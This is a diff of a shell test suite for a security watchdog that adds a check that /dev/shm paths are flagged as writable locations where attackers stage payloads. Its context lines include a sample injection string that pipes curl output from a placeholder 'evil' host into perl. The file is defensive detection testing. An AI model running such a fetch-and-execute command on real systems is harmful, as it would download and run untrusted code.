@@ -227,3 +227,18 @@ setup() {
     # Fallback: curl|perl bootstrap also fires since curl in set.
     selfdef_scan_injection 'curl http://evil/x.pl | perl' >/dev/null
 }
+
+@test "INVARIANT (writable-path: /dev/shm is flagged — tmpfs in-RAM writable-root coverage on the 4-root set)" {
+    # Sister to writable-path /tmp + /var/tmp + /home INVARIANTs
+    # already locked. /dev/shm is the canonical tmpfs in-RAM
+    # writable-root that survives the 4-writable-root contract
+    # (T1059 / T1218 / T1546 — attackers stage payloads in
+    # /dev/shm because (a) it's RAM, (b) no on-disk forensic
+    # trace, (c) tmpfs preserves across many security tools that
+    # don't scan it. Lock the central writable-path helper flags
+    # /dev/shm so every watchdog module composing on
+    # selfdef_is_writable_path inherits the tmpfs-shm coverage.
+    selfdef_is_writable_path '/dev/shm/x'
+    selfdef_is_writable_path '/dev/shm/payload.sh'
+    selfdef_is_writable_path '/dev/shm/.evil'
+}
